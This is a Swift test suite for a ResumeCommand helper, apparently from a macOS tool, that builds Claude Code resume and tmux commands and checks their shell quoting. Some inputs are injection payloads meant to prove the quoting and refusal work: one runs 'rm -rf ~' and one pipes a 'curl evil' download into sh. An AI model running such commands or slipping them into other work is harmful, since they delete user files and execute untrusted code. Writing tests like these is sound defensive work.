import Foundation
import ChuteCore

func resumeCommandSuite() {
    T.suite("ResumeCommand") {
        let id = "14e46ac7-12b2-4980-b920-4bfe991be17b"

        T.eq(ResumeCommand.resume(agent: "claude", sessionID: id),
             "claude --resume \(id)", "the plain resume is the agent's own flag")

        // Only Claude Code's resume syntax is known. Inventing one for another agent would put a
        // command on someone's clipboard that fails when they run it.
        T.eq(ResumeCommand.resume(agent: "codex", sessionID: id), nil,
             "an agent whose resume syntax we do not know gets no command")
        T.eq(ResumeCommand.resume(agent: nil, sessionID: id), nil, "and neither does a plain shell")

        // CONTINUE, NOT MOVE. macOS cannot transplant a running process onto a new tty, so this
        // RE-CREATES the session: same directory, agent resumed by its own id.
        T.eq(ResumeCommand.tmux(project: "37.chute", cwd: "/Users/x/proj", agent: "claude", sessionID: id),
             "tmux new-session -A -s 'chute-37.chute' -c '/Users/x/proj' 'claude --resume \(id)'",
             "attaches if it already exists, so pasting it twice is harmless")

        T.eq(ResumeCommand.tmux(project: "a b", cwd: nil, agent: "claude", sessionID: id),
             "tmux new-session -A -s 'chute-a-b' 'claude --resume \(id)'",
             "no directory is simply omitted, and spaces in a project become dashes")

        // A path is not ours to trust just because it came off this machine: it reaches us from a
        // JSON file written by a shell hook, and it lands on a clipboard the user will paste into
        // a shell. Single-quoted, with the one escape single-quoting permits.
        T.eq(ResumeCommand.shellQuote("/tmp/it's here"), #"'/tmp/it'\''s here'"#,
             "an apostrophe cannot end the quoting")
        T.ok(ResumeCommand.tmux(project: "p", cwd: "/x'; rm -rf ~; echo '", agent: "claude", sessionID: id)!
                .contains(#"'/x'\''; rm -rf ~; echo '\'''"#),
             "an injection attempt stays inside one quoted argument")

        // The session name is built from a project name, which comes from a window title.
        T.eq(ResumeCommand.tmux(project: "a/b:c$d", cwd: nil, agent: "claude", sessionID: id),
             "tmux new-session -A -s 'chute-abcd' 'claude --resume \(id)'",
             "anything that is not a plain name is dropped from the session name")

        T.eq(ResumeCommand.tmux(project: "p", cwd: nil, agent: "codex", sessionID: id), nil,
             "no resume syntax means no tmux command either")

        // The id was the ONE hook-file field reaching the clipboard unquoted, inside the literal
        // single quotes `tmux` wraps the command in. Refused, the way AgentTranscript.find
        // refuses the same field, rather than quoted.
        T.eq(ResumeCommand.resume(agent: "claude", sessionID: "x'; curl evil | sh; :'"), nil,
             "a session id that is not a plain token yields no command at all")
        T.eq(ResumeCommand.tmux(project: "p", cwd: "/x", agent: "claude", sessionID: "a b"), nil,
             "and so the tmux form refuses it too")
        T.eq(ResumeCommand.resume(agent: "claude", sessionID: ""), nil, "an empty id is not a session")
    }
}
